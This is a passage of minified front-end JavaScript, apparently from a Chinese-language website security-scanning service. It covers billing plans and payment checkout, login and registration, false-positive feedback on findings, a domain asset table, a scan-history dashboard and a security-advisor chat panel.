s.json()}).then(function(s){if(s.id||s.asset_id)F("资产添加成功","success"),document.getElementById("asset-domain").value="",document.getElementById("asset-owner").value="",document.getElementById("asset-description").value="",Ks();else{let o=Js(s)||"添加失败";r&&(r.textContent=o,r.style.display="block")}}).catch(function(s){r&&(r.textContent="添加失败: "+s.message,r.style.display="block")})}const vn=(...e)=>typeof window.navigateTo=="function"&&window.navigateTo(...e),bi=()=>typeof window.updateUserCredits=="function"&&window.updateUserCredits();function mn(e){return e==null?"--":"¥"+(e/100).toFixed(2)}function Qs(e){if(e==null)return"--";let i=parseInt(e,10);return isNaN(i)?String(e):i.toLocaleString("zh-CN")}function eo(e){let i=parseInt(e&&e.credits,10),t=parseInt(e&&e.price_cents,10);return!i||!t?"--":(t/i/100).toFixed(2)}function to(e){if(!e||!e.length)return null;let i=null,t=Number.POSITIVE_INFINITY;return e.forEach(function(r){let s=parseInt(r.credits,10),o=parseInt(r.price_cents,10);if(!s||!o)return;let a=o/s;a<t&&(t=a,i=r.id)}),i}function io(e,i){return e.id===i?"推荐":(e.name||"").includes("企业")?"企业版":(e.name||"").includes("专业")?"专业版":(e.name||"").includes("标准")?"标准版":(e.name||"").includes("体验")?"体验版":""}function no(e){const i=(e.name||"").toLowerCase();return i.includes("企业")?"团队采购 / 扩容":i.includes("专业")?"安全运营 / 交付":i.includes("标准")?"日常扫描 / 复测":i.includes("体验")?"入门起步":"个人 / 试点使用"}function ro(e){const i=parseInt(e&&e.credits,10)||0;return i>=1e3?"企业采购":i>=500?"专业运营":i>=100?"标准使用":"入门起步"}function so(e){return{mock:"模拟支付",stripe:"Stripe",alipay:"支付宝",wechat:"微信支付"}[e]||e}function oo(e){return{pending:"待支付",paid:"已到账",failed:"失败",cancelled:"已取消"}[e]||e}function yn(){if(!ve()){F("请先登录后再查看计费套餐","warn"),vn("profile");return}ao(),yt(),po()}function ao(){let e=document.getElementById("billing-plans-list");e&&(e.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在加载套餐...</div>',Jn().then(function(i){let t=i&&i.data&&i.data.plans||i&&i.plans||[];if(!t.length){e.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">暂无可用套餐</div>';return}let r=to(t),s='<div style="display:flex;flex-direction:column;gap:12px">';s+='<div style="display:flex;flex-wrap:wrap;gap:10px;padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:2px;font-size:12px;color:var(--text-secondary)">',s+="<div>• 所有订单都会进入充值记录，便于财务对账与追踪</div>",s+="<div>• 充值后可立即用于扫描、复测、修复验证、报告导出和审计留痕</div>",s+="<div>• 支持模拟支付、Stripe，以及支付宝/微信测试回调与骨架通道</div>",s+="</div>",s+='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px">',t.forEach(function(o){let a=o.id===r,n=io(o,r),c=a?"var(--warning)":"var(--border)",g=a?"0 0 0 1px rgba(240,167,50,0.35)":"none";s+='<div style="background:var(--bg);border:1px solid '+c+";box-shadow:"+g+';border-radius:2px;padding:14px;display:flex;flex-direction:column;gap:8px;position:relative">',n&&(s+='<div style="position:absolute;top:10px;right:10px;background:'+(a?"var(--warning)":"var(--primary)")+';color:#fff;font-size:11px;font-weight:700;padding:3px 8px;border-radius:999px">'+E(n)+"</div>"),s+='<div style="font-size:15px;font-weight:700">'+E(o.name)+"</div>",s+='<div style="font-size:12px;color:var(--text-secondary);min-height:34px">'+E(o.description||"")+"</div>",s+='<div style="font-size:22px;font-weight:700;color:var(--warning)">'+mn(o.price_cents)+"</div>",s+='<div style="font-size:13px;color:var(--text-secondary)">含 <strong style="color:var(--text)">'+Qs(o.credits)+"</strong> 积分</div>",s+='<div style="font-size:12px;color:var(--text-secondary)">约 <strong style="color:var(--text)">'+eo(o)+" 元/积分</strong></div>",s+='<div style="font-size:12px;color:var(--text-secondary)">适合：'+E(no(o))+"</div>",s+='<div style="font-size:12px;color:var(--text-secondary)">可用于：扫描 / 复扫 / 报告 / 工单 / 审计</div>',s+='<div style="font-size:12px;color:var(--text-secondary)">权限：'+E(ro(o))+"</div>",s+='<button class="fixer-btn primary" style="width:100%;margin-top:auto" onclick="buyPlan('+o.id+', event)">立即购买</button>',s+="</div>"}),s+="</div>",s+='<div style="padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:2px;font-size:12px;color:var(--text-secondary);line-height:1.7">',s+='<div style="font-weight:700;color:var(--text);margin-bottom:4px">购买后流程</div>',s+="<div>1. 选择套餐并完成支付 → 2. 积分立即到账 → 3. 直接进入扫描或复扫 → 4. 结果会进入报告、工单和审计 → 5. 可按项目或团队需求继续升级。</div>",s+="</div>",s+='<div style="margin-top:12px;padding:12px 14px;background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.2);border-radius:2px;font-size:12px;color:var(--text-secondary);line-height:1.7">',s+='<div style="font-weight:700;color:var(--primary);margin-bottom:4px">交付前确认</div>',s+="<div>建议上线前重点确认：支付回调签名、积分扣减日志、权限分层、导出权限、审计日志留存，以及客户能否看懂套餐价值与结果证据。</div>",s+="</div>",e.innerHTML=s}).catch(function(i){e.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">加载套餐失败</div>'}))}function lo(e,i){if(i&&i.stopPropagation(),!ve()){F("请先登录","warn"),vn("profile");return}let t="mock";window.__STRIPE_PUBLISHABLE_KEY__&&(t="stripe");let r=(window.__PUBLIC_BASE_URL__||window.location.origin).replace(/\/$/,"");Kn({plan_id:e,provider:t,success_url:r+"/billing?status=success",cancel_url:r+"/billing?status=cancel"}).then(function(s){if(!s||!s.success){F(Ne(s)||"创建订单失败","error");return}s.data&&s.data.checkout_url?window.location.href=s.data.checkout_url:s.data&&s.data.transaction_id?(F("支付成功，积分已到账","success"),bi(),yt()):F("订单状态异常","error")}).catch(function(s){F("购买失败："+(s.message||"网络错误"),"error")})}function yt(e){e=parseInt(e,10)||1;let i=10,t=(e-1)*i,r=document.getElementById("billing-records-list");r&&(r.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取充值记录...</div>',Qn(i,t).then(function(s){let o=s&&s.data&&s.data.records||s&&s.records||[],a=s&&s.data&&s.data.total||s&&s.total||o.length,n=s&&s.meta||{},c=n.limit||i,g=n.offset||t,v=Math.floor(g/c)+1,d=Math.max(1,Math.ceil(a/c));co(o),oi("billing-records-pagination",v,d,function(f){yt(f)}),He("billing-records-pagination",d>1?"flex":"none")}).catch(function(s){r.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">读取充值记录失败</div>'}))}function co(e){let i=document.getElementById("billing-records-list");if(!i)return;if(!e||!e.length){i.innerHTML='<div style="text-align:center;padding:24px;color:var(--text-secondary)">暂无充值记录</div>';return}let t='<div style="display:flex;flex-direction:column;gap:8px">';e.forEach(function(r){let s=r.amount_cents?mn(r.amount_cents):"免费",o=r.status==="paid"?"var(--success)":r.status==="pending"?"var(--warning)":"var(--danger)";t+='<div style="display:flex;align-items:center;justify-content:space-between;padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px">',t+="<div>",t+='<div style="font-size:13px;font-weight:600">'+E(r.plan_name||"充值")+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">'+Nt(r.created_at)+" · "+so(r.payment_provider)+"</div>",t+="</div>",t+='<div style="text-align:right">',t+='<div style="font-size:13px;font-weight:700">'+s+"</div>",t+='<div style="font-size:11px;color:'+o+';margin-top:2px">'+oo(r.status)+"</div>",t+="</div></div>"}),t+="</div>",i.innerHTML=t}function po(){let e=new URLSearchParams(window.location.search),i=e.get("status"),t=e.get("transaction_id");if(!(!i&&!t)){if(i==="cancel"){F("支付已取消","warn"),Oi();return}t?(F("正在确认支付结果...","success"),uo(t)):i==="success"&&(F("支付成功","success"),bi(),yt()),Oi()}}function Oi(){try{let e=new URL(window.location.href);e.searchParams.delete("status"),e.searchParams.delete("transaction_id"),window.history.replaceState({},"",e.toString())}catch{}}function uo(e){let i=0,t=10,r=setInterval(function(){i++,Yn(e).then(function(s){let o=s&&s.data||s;if(o&&o.status==="paid"){clearInterval(r),F("支付成功，积分已到账","success"),bi(),yt();return}i>=t&&(clearInterval(r),F("支付结果确认超时，请稍后刷新查看","warn"))}).catch(function(){i>=t&&clearInterval(r)})},2e3)}function fo(){typeof window<"u"&&(window.buyPlan=lo,window.loadBillingPage=yn)}let ri=null;(function(){var i=!1;function t(r){if(!i){i=!0;try{let s=document.createElement("div");s.style.cssText="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);color:#fff;z-index:99999;display:flex;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif",s.innerHTML='<div style="max-width:500px;padding:30px;background:#1e293b;border-radius:2px;text-align:center;border:1px solid #c75450"><div style="font-size:48px;margin-bottom:12px">!</div><h2 style="margin:0 0 8px;color:#c75450">页面遇到错误</h2><p style="color:#94a3b8;font-size:14px;margin:0 0 16px;line-height:1.6">页面运行过程中出现了未预期的错误，可以刷新页面试试。</p><p style="color:#64748b;font-size:12px;margin:0 0 16px;font-family:monospace;word-break:break-all">'+(r||"未知错误").substring(0,200)+'</p><button onclick="location.reload()" style="background:#4b6eaf;color:#fff;border:none;padding:10px 24px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600">刷新页面</button></div>',document.body.appendChild(s)}catch(s){console.error("Global error handler failed:",s)}}}window.addEventListener("error",function(r){console.error("Global error:",r.error||r.message),!(r.target&&r.target!==window&&(r.target.tagName==="IMG"||r.target.tagName==="LINK"||r.target.tagName==="SCRIPT"))&&t(r.message||String(r.error))},!0),window.addEventListener("unhandledrejection",function(r){console.error("Unhandled promise rejection:",r.reason)})})();function ke(e){return document.getElementById(e)||null}function go(e,i){let t=ke(e);t&&(t.innerHTML=i)}function ho(e,i){let t=ke(e);t&&(t.style.display=i)}function Mi(e,i){let t=document.getElementById(e),r=document.getElementById(i);!t||!r||t.addEventListener("change",function(){typeof window.updateScanStartState=="function"&&window.updateScanStartState()})}function vo(){Mi("auth-check-step1","scan-btn-step1"),Mi("auth-check","scan-btn");try{mo()}catch(e){console.warn("restoreAuthCheckbox error:",e)}}var ut=!1;function mo(){let e=!1;try{e=localStorage.getItem("vs_auth_checked")==="true"}catch{}let i=document.getElementById("auth-check-step1"),t=document.getElementById("auth-check"),r=document.getElementById("batch-auth-check");if(e){ut=!0,i&&(i.checked=!0),t&&(t.checked=!0),r&&(r.checked=!0),ut=!1;let o=document.getElementById("scan-btn-step1"),a=document.getElementById("scan-btn"),n=document.getElementById("batch-go-btn");o&&(o.disabled=!1),a&&(a.disabled=!1),n&&(n.disabled=!1)}function s(o,a){o&&o.addEventListener("change",function(){if(ut)return;let n=o.checked;ut=!0,a.forEach(function(v){v&&(v.checked=n)}),ut=!1;let c=document.getElementById("scan-btn"),g=document.getElementById("batch-go-btn");c&&(c.disabled=!n),g&&(g.disabled=!n);try{localStorage.setItem("vs_auth_checked",n?"true":"false")}catch{}})}s(i,[t,r]),s(t,[i,r]),s(r,[i,t])}function pe(e){if(e==null)return"";let i=document.createElement("div");return i.appendChild(document.createTextNode(String(e))),i.innerHTML}function yo(e){return String(e??"").replace(/'/g,"&#39;").replace(/"/g,"&quot;")}function tt(e){if(!e)return"未知错误";if(typeof e.error=="string"&&e.error)return e.error;if(typeof e.detail=="string"&&e.detail)return e.detail;if(typeof e.message=="string"&&e.message)return e.message;if(Array.isArray(e.detail)&&e.detail.length>0){let i=e.detail.map(function(t){return t&&typeof t.msg=="string"?t.msg:t&&typeof t=="string"?t:""}).filter(Boolean);if(i.length>0)return i.join("；")}return"未知错误"}function Pi(e,i){let t=ke(e);t&&(i?(t.disabled=!0,t.dataset.originalText=t.dataset.originalText||t.textContent,t.innerHTML='<span class="spinner" style="width:16px;height:16px;margin-right:6px;border-color:rgba(255,255,255,0.3);border-top-color:#fff"></span>'+pe(t.dataset.originalText)):(t.disabled=!1,t.dataset.originalText&&(t.textContent=t.dataset.originalText)))}function Wt(){try{return localStorage.getItem("vs_token")}catch{return null}}function bn(e){try{localStorage.setItem("vs_token",e)}catch{}}function xn(){try{localStorage.removeItem("vs_token")}catch{}}function Be(){return!!Wt()}function bo(){try{return localStorage.getItem("vs_username")||""}catch{return""}}var Ri="";function Je(){let e=Wt();return e?{Authorization:"Bearer "+e}:{}}function Se(e,i){i=i||{},i.headers=i.headers||{};let t=!!i.skipAuthExpiry,r=Wt();r&&(i.headers.Authorization="Bearer "+r),!i.headers["Content-Type"]&&i.body&&(i.headers["Content-Type"]="application/json");let s=e.indexOf("http")===0?e:Ri+e;return fetch(s,i).then(function(o){if(o.status===404&&e.indexOf("/api/")===0&&e.indexOf("/api/v1/")!==0){let a=e.indexOf("http")===0?e:Ri+"/api/v1"+e.slice(4);return fetch(a,i)}if(o.status===401&&!t){xn();try{localStorage.removeItem("vs_username")}catch{}throw typeof lt=="function"&&lt(),new Error("登录已过期，请重新登录")}return o}).catch(function(o){throw o.message&&o.message.indexOf("Failed to fetch")>=0?new Error("网络请求失败。请确认后端服务是否已启动（python main.py）。"):o})}function wn(e){let i=document.getElementById("auth-guest"),t=document.getElementById("auth-register"),r=document.getElementById("auth-reset"),s=document.getElementById("auth-logged");e==="register"?(i&&(i.style.display="none"),t&&(t.style.display="block"),r&&(r.style.display="none"),s&&(s.style.display="none")):e==="login"?(i&&(i.style.display="block"),t&&(t.style.display="none"),r&&(r.style.display="none"),s&&(s.style.display="none")):e==="reset"&&(i&&(i.style.display="none"),t&&(t.style.display="none"),r&&(r.style.display="block"),s&&(s.style.display="none"))}function lt(){let e=document.getElementById("auth-guest"),i=document.getElementById("auth-register"),t=document.getElementById("auth-reset"),r=document.getElementById("auth-logged"),s=document.getElementById("scan-login-tip"),o=document.getElementById("api-token-input");if(Be()){e&&(e.style.display="none"),i&&(i.style.display="none"),t&&(t.style.display="none"),r&&(r.style.display="block"),s&&(s.style.display="none");let a=bo(),n=document.getElementById("auth-display-name");if(n&&(n.textContent=a||"用户"),o){let c=Wt();o.value=c||"Token 不可用"}}else e&&(e.style.display="block"),i&&(i.style.display="none"),t&&(t.style.display="none"),r&&(r.style.display="none"),s&&(s.style.display="block"),o&&(o.value="登录后显示 Token")}function xo(){if(!Be()){ie("请先登录","error");return}let e=document.getElementById("api-token-input");if(!e||!e.value||e.value.indexOf("登录")!==-1||e.value==="Token 不可用"){ie("Token 不可用，请重新登录","error");return}navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(e.value).then(function(){ie("Token 已复制","success")}).catch(function(){ie("复制失败","error")}):ie("浏览器不支持自动复制，请手动选择文本复制","error")}function wo(){if(!Be()){ie("请先登录后再修改密码"),wn("login");return}let e=document.getElementById("reset-new-password"),i=document.getElementById("reset-new-password2"),t=document.getElementById("reset-error");if(!e||!i){ie("密码重置表单加载失败");return}let r=e.value,s=i.value;if(t&&(t.textContent=""),!r||r.length<6){t&&(t.textContent="新密码至少 6 个字符");return}if(r!==s){t&&(t.textContent="两次密码不一致");return}Se("/api/reset-password",{method:"POST",body:JSON.stringify({new_password:r})}).then(function(o){return o.json()}).then(function(o){o.success?(ie("密码已修改，请用新密码登录"),kn()):t.textContent=tt(o)||"修改失败"}).catch(function(o){t&&(t.textContent="修改失败: "+o.message)})}function Fi(){let e=document.getElementById("login-username"),i=document.getElementById("login-password"),t=document.getElementById("login-error");if(!e||!i){ie("登录表单加载失败");return}let r=e.value.trim(),s=i.value.trim();if(t&&(t.textContent=""),!r||!s){t&&(t.textContent="请输入用户名和密码");return}Se("/api/login",{skipAuthExpiry:!0,method:"POST",body:JSON.stringify({username:r,password:s})}).then(function(o){return o.json()}).then(function(o){let a=o.token||o.data&&o.data.token,n=o.username||o.data&&o.data.username||r;if(a){bn(a);try{localStorage.setItem("vs_username",n)}catch{}lt(),Ke(),Pe(),typeof window.updateScanCreditsHint=="function"&&window.updateScanCreditsHint(),ie("登录成功，欢迎 "+n),bt("scan")}else t&&(t.textContent=tt(o)||"登录失败")}).catch(function(o){t&&(t.textContent="登录失败: "+o.message)})}function It(){let e=document.getElementById("reg-username"),i=document.getElementById("reg-email"),t=document.getElementById("reg-password"),r=document.getElementById("reg-password2"),s=document.getElementById("register-error");if(!e||!t||!r){ie("注册表单加载失败");return}let o=e.value.trim(),a=i?i.value.trim():"",n=t.value.trim(),c=r.value.trim();if(s&&(s.textContent=""),!o||!n){s&&(s.textContent="请输入用户名和密码");return}if(n!==c){s&&(s.textContent="两次密码不一致");return}if(n.length<6){s&&(s.textContent="密码至少 6 个字符");return}let g={username:o,password:n};a&&(g.email=a),Se("/api/register",{skipAuthExpiry:!0,method:"POST",body:JSON.stringify(g)}).then(function(v){return v.json()}).then(function(v){let d=v.token||v.data&&v.data.token,f=v.username||v.data&&v.data.username||o;if(d){bn(d);try{localStorage.setItem("vs_username",f)}catch{}lt(),Ke(),Pe(),typeof window.updateScanCreditsHint=="function"&&window.updateScanCreditsHint(),ie("注册成功，欢迎 "+f),bt("scan")}else s&&(s.textContent=tt(v)||"注册失败")}).catch(function(v){s&&(s.textContent="注册失败: "+v.message)})}function kn(){xn();try{localStorage.removeItem("vs_username")}catch{}lt();let e=document.getElementById("nav-alert-badge");e&&(e.style.display="none"),ie("已退出登录"),bt("home")}function bt(e){try{if(e==="scan"){let s=document.getElementById("page-home");s&&s.classList.add("active"),document.querySelectorAll(".page").forEach(function(n){n.id!=="page-home"&&n.classList.remove("active")});let o=document.querySelector('.nav-item[data-page="scan"]');o&&o.classList.add("active"),document.querySelectorAll(".nav-item").forEach(function(n){n.getAttribute("data-page")!=="scan"&&n.classList.remove("active")});let a=document.querySelector(".scan-section");a&&a.scrollIntoView({behavior:"smooth",block:"start"}),typeof window.loadDashboard=="function"&&window.loadDashboard();return}let i=document.getElementById("page-"+e);i&&i.classList.add("active"),document.querySelectorAll(".page").forEach(function(s){s.id!=="page-"+e&&s.classList.remove("active")});let t=e==="result"?"scan":e,r=document.querySelector('.nav-item[data-page="'+t+'"]');r&&r.classList.add("active"),document.querySelectorAll(".nav-item").forEach(function(s){s.getAttribute("data-page")!==t&&s.classList.remove("active")}),window.scrollTo({top:0,behavior:"smooth"}),e==="tickets"&&(Ps(),et()),e==="assets"&&xi(),e==="evolution"&&Zt(),e==="billing"&&yn()}catch(i){console.error("navigateTo error:",i)}}let si=[],Tt=0,ko=3,_o=2500;function ie(e,i){si.push({msg:e,type:i}),_n()}function _n(){if(Tt>=ko||si.length===0)return;let e=si.shift();Tt++;let i=document.getElementById("toast-container");if(!i){Tt--;return}let t=document.createElement("div");t.className="toast";let r="ℹ️";e.type==="error"?r="[错误]":e.type==="success"?r="[成功]":e.type==="warn"&&(r="[警告]");let s=document.createElement("span");s.textContent=r+" ",s.style.marginRight="6px",t.appendChild(s),t.appendChild(document.createTextNode(e.msg)),e.type==="error"?t.classList.add("error"):e.type==="success"&&t.classList.add("success"),i.appendChild(t),requestAnimationFrame(function(){requestAnimationFrame(function(){t.classList.add("show")})}),setTimeout(function(){t.classList.add("hiding"),t.classList.remove("show"),setTimeout(function(){t.parentNode&&t.parentNode.removeChild(t),Tt--,_n()},300)},_o)}function So(e,i,t,r){if(!i){ie("finding 名称缺失","error");return}if(!Be()){ie("请先登录后再标记误报","error");return}if(e.disabled)return;e.disabled=!0;let s=e.innerHTML;e.innerHTML="提交中...";let o=typeof Se=="function"?Se:fetch,a="/api/finding/feedback",n=JSON.stringify({scan_id:t||0,finding_name:i,is_false_positive:!!r,is_confirmed:!r}),c=o(a,{method:"POST",headers:{"Content-Type":"application/json"},body:n});Promise.resolve(c).then(function(g){return g.json().then(function(v){return{ok:g.ok,d:v}})}).then(function(g){if(g.ok&&g.d&&g.d.success){let v=e.closest(".finding-detail");if(v)if(r){v.classList.add("fp-marked"),v.classList.remove("confirmed");let f=v.querySelector(".finding-detail-header");if(f&&!f.querySelector(".fp-badge")){let m=document.createElement("span");m.className="fp-badge",m.textContent="已被标记为误报",f.appendChild(m)}let h=v.querySelector(".finding-feedback-row");if(h&&!h.querySelector(".fp-reason-text")){let m=document.createElement("span");m.className="fp-reason-text",m.textContent="已标记为误报，将用于优化未来检测",h.appendChild(m)}}else{v.classList.add("confirmed"),v.classList.remove("fp-marked");let f=v.querySelector(".finding-detail-header");if(f&&!f.querySelector(".confirmed-badge")){let m=document.createElement("span");m.className="confirmed-badge",m.textContent="已确认",f.appendChild(m)}let h=v.querySelector(".finding-feedback-row");if(h&&!h.querySelector(".fp-reason-text")){let m=document.createElement("span");m.className="fp-reason-text",m.style.color="#73c990",m.textContent="已确认为真实漏洞，感谢您的反馈",h.appendChild(m)}}(v||document).querySelectorAll(".finding-feedback-row .finding-feedback-btn").forEach(function(f){f.disabled=!0,f.textContent=f.classList.contains("btn-confirm")?"准确":"误报"}),ie(r?"已记录为误报，感谢反馈！":"已确认为真实漏洞，感谢反馈！","success")}else e.disabled=!1,e.innerHTML=s,ie("提交失败: "+(g.d&&(g.d.error||g.d.detail)||"未知错误"),"error")}).catch(function(g){e.disabled=!1,e.innerHTML=s,ie("提交失败: "+g.message,"error")})}let We=[];function xi(){if(!Be()){go("asset-list",""),ho("asset-empty","block");let e=document.getElementById("asset-empty");e&&(e.innerHTML='<div class="ticket-empty-icon"></div><p>请先登录查看资产</p><p class="ticket-empty-hint">登录后管理您的域名资产</p>');return}Se("/api/assets").then(function(e){return e.json()}).then(function(e){e&&e.assets?(We=e.assets,Kt(We)):(We=[],Kt(We))}).catch(function(e){ie("加载资产失败: "+e.message,"error"),We=[],Kt(We)})}function Kt(e){let i=document.getElementById("asset-list"),t=document.getElementById("asset-empty");if(!i)return;if(!e||e.length===0){i.innerHTML="",t&&(t.style.display="block",t.innerHTML='<div class="ticket-empty-icon"></div><p>暂无资产</p><p class="ticket-empty-hint">添加您的第一个域名资产，开始安全扫描</p>');return}t&&(t.style.display="none");let r='<div class="asset-table-wrap"><table class="asset-table">';r+="<thead><tr><th>域名</th><th>负责人</th><th>验证状态</th><th>评分</th><th>操作</th></tr></thead><tbody>",e.forEach(function(s){let o=s.verified||!1,a=o?"verified":"pending",n=o?"已验证":"待验证",c=s.score,g="high";c==null?(c="-",g=""):c<50?g="low":c<75&&(g="medium"),r+="<tr>",r+='<td data-label="域名"><div class="asset-domain">'+pe(s.domain||"")+'</div><div class="asset-meta">'+pe(s.description||"")+"</div></td>",r+='<td data-label="负责人">'+pe(s.owner||"-")+"</td>",r+='<td data-label="验证状态"><span class="asset-badge '+a+'">'+n+"</span></td>",r+='<td data-label="评分"><div class="asset-score '+g+'">'+c+"</div></td>",r+='<td data-label="操作"><div class="asset-actions">',r+='<button class="asset-btn primary" onclick="scanAsset('+s.id+", '"+yo(s.domain||"")+`')">扫描</button>`,r+='<button class="asset-btn secondary" onclick="editAsset('+s.id+')">编辑</button>',r+='<button class="asset-btn danger" onclick="deleteAsset('+s.id+')">删除</button>',r+="</div></td>",r+="</tr>"}),r+="</tbody></table></div>",i.innerHTML=r}function Zt(){if(!Be()){let i=document.getElementById("evolution-content");i&&(i.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>请先登录</p><p class="ticket-empty-hint">登录后使用智能学习、主动监控、团队协作与安全顾问</p></div>');return}let e=document.getElementById("evolution-content");e&&(e.innerHTML='<div class="loading">正在读取进化中心数据...</div>'),Se("/api/evolution/dashboard").then(function(i){return i.json()}).then(function(i){i&&i.success?Eo(i):e&&(e.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>暂未登录或无数据</p></div>')}).catch(function(i){e&&(e.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>加载失败: '+pe(i.message)+"</p></div>")})}function Eo(e){let i=document.getElementById("evolution-content");if(!i)return;let t=Math.round(e.evolution_score||0),r=e.learning||{},s=e.monitoring||{},o=e.team||{},a=r.trend||[],n=r.persistent_issues||[],c=r.recommendations||[],g=r.predicted_next_score,v=t>=80?"#73c990":t>=50?"#f0a732":"#c75450",d="";d+='<div class="evo-score-card">',d+='  <div class="evo-score-label">进化指数</div>',d+='  <div class="evo-score-value" style="color:'+v+'">'+t+"</div>",d+='  <div class="evo-score-bar"><div class="evo-score-fill" style="width:'+t+"%;background:"+v+'"></div></div>',d+='  <div class="evo-score-hint">基于历史扫描、监控告警与团队协作综合计算</div>',d+="</div>",d+='<div class="evo-grid">',d+=Ct("智能学习","","#4b6eaf",[{k:"总扫描次数",v:r.total_scans||0},{k:"平均分",v:r.avg_score||"-"},{k:"最高分",v:r.best_score||"-"},{k:"预测下次",v:g||"-"}],()=>At("learning")),d+=Ct("主动监控","","#c75450",[{k:"监控项",v:s.monitors_count||0},{k:"未读告警",v:s.unread_alerts||0},{k:"状态",v:s.monitors_count?"运行中":"未启用"}],()=>At("monitoring")),d+=Ct("安全顾问","","#4b6eaf",[{k:"会话记忆",v:"已启用"},{k:"建议数",v:c.length},{k:"响应",v:"实时"}],()=>At("ai")),d+=Ct("团队协作","","#73c990",[{k:"加入团队",v:o.teams_count||0},{k:"评论",v:"可发起"},{k:"状态",v:o.teams_count?"已加入":"未加入"}],()=>At("team")),d+="</div>",d+='<div class="evo-row">',d+='  <div class="evo-panel">',d+='    <div class="evo-panel-title">评分趋势</div>',a.length===0?d+='    <div class="evo-empty">暂无历史评分，先做一次扫描</div>':(d+='    <div class="evo-trend">',a.forEach(function(f){d+='<div class="evo-trend-item"><div class="evo-trend-score">'+f.score+'</div><div class="evo-trend-date">'+pe(f.date||"")+"</div></div>"}),d+="    </div>"),d+="  </div>",d+='  <div class="evo-panel">',d+='    <div class="evo-panel-title">持续问题</div>',n.length===0?d+='    <div class="evo-empty">暂无持续性问题</div>':(d+='    <ul class="evo-list">',n.forEach(function(f){if(typeof f=="string")d+="<li>"+pe(f)+"</li>";else if(f&&typeof f=="object"){let h=f.name||f.title||f.issue||JSON.stringify(f),m=f.times?' <span class="evo-empty">×'+f.times+"</span>":"",u=f.severity?' <span class="evo-alert-time">['+pe(f.severity)+"]</span>":"";d+="<li>"+pe(h)+m+u+"</li>"}else d+="<li>"+pe(String(f))+"</li>"}),d+="    </ul>"),d+="  </div>",d+="</div>",d+='<div class="evo-panel">',d+='  <div class="evo-panel-title">个性化建议</div>',c.length===0?d+='  <div class="evo-empty">完成更多扫描后，系统会给出更精准的建议</div>':(d+='  <ul class="evo-recs">',c.forEach(function(f){d+="<li>"+pe(f)+"</li>"}),d+="  </ul>"),d+="</div>",s.alerts&&s.alerts.length>0&&(d+='<div class="evo-panel">',d+='  <div class="evo-panel-title">最新告警</div>',d+='  <ul class="evo-alerts">',s.alerts.slice(0,5).forEach(function(f){d+='<li><span class="evo-alert-time">'+pe(f.created_at||"")+"</span> - "+pe(f.message||"")+"</li>"}),d+="  </ul>",d+="</div>"),i.innerHTML=d}function Ct(e,i,t,r,s){let o='<div class="evo-card" style="border-top:2px solid '+t+'" onclick="('+s.toString()+')()">';return o+='  <div class="evo-card-head"><span class="evo-card-icon" style="background:#313335;color:'+t+'">'+i+'</span><span class="evo-card-title">'+e+"</span></div>",o+='  <div class="evo-card-items">',r.forEach(function(a){o+='<div class="evo-card-item"><div class="evo-card-k">'+pe(a.k)+'</div><div class="evo-card-v">'+pe(String(a.v))+"</div></div>"}),o+="  </div>",o+="</div>",o}function At(e){let i="";e==="monitoring"?(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">添加监控</div>',i+='  <div class="evo-detail-form">',i+='    <input id="mon-url" class="evo-input" placeholder="https://example.com" />',i+='    <input id="mon-freq" class="evo-input" type="number" min="60" value="3600" placeholder="检查频率(秒)" />',i+='    <button class="evo-btn" onclick="createMonitor()">创建监控</button>',i+="  </div>",i+='  <div id="evo-mon-list"></div>',i+="</div>",ie("提示:在弹窗中可创建监控","info")):e==="ai"?(i='<div class="ai-chat-wrap">',i+='  <div class="ai-status-bar" id="ai-status-bar"><span class="ai-status-dot pending"></span><span class="ai-status-text">检测中...</span></div>',i+='  <div class="ai-quick">',i+=`    <button class="ai-quick-btn" onclick="aiSend('我的网站最近有什么风险?')">我的风险</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('怎么修 HSTS 缺失?')">修 HSTS</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('我应该先修哪个问题?')">优先级</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('解释一下 CSP 是什么')">CSP 解释</button>`,i+="  </div>",i+='  <div id="evo-ai-msgs" class="ai-msgs">',i+='    <div class="ai-msg bot">',i+='      <div class="ai-msg-avatar">顾问</div>',i+='      <div class="ai-msg-body">',i+='        <div class="ai-msg-name">安全顾问</div>',i+='        <div class="ai-msg-content">你好！我是漏洞哨兵的安全顾问。<br><br>我可以帮你：<br>• 分析扫描报告与漏洞优先级<br>• 给出可执行的安全修复步骤<br>• 解释安全概念与配置示例<br>• 基于你的历史给出个性化建议<br><br>试试上方的快捷问题，或直接输入想了解的安全问题。</div>',i+="      </div>",i+="    </div>",i+="  </div>",i+='  <div class="ai-input-bar">',i+='    <textarea id="evo-ai-q" class="ai-input" rows="1" placeholder="问点什么…(Shift+Enter 换行)"></textarea>',i+='    <button class="ai-send-btn" id="ai-send-btn" onclick="aiAsk()">发送</button>',i+="  </div>",i+="</div>",setTimeout(function(){Io();let s=document.getElementById("evo-ai-q");s&&(s.addEventListener("keydown",function(o){o.key==="Enter"&&!o.shiftKey&&(o.preventDefault(),Sn())}),s.addEventListener("input",function(){this.style.height="auto",this.style.height=Math.min(this.scrollHeight,120)+"px"}))},100)):e==="team"?(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">团队协作</div>',i+='  <div class="evo-detail-form">',i+='    <input id="team-name" class="evo-input" placeholder="团队名称" />',i+='    <button class="evo-btn" 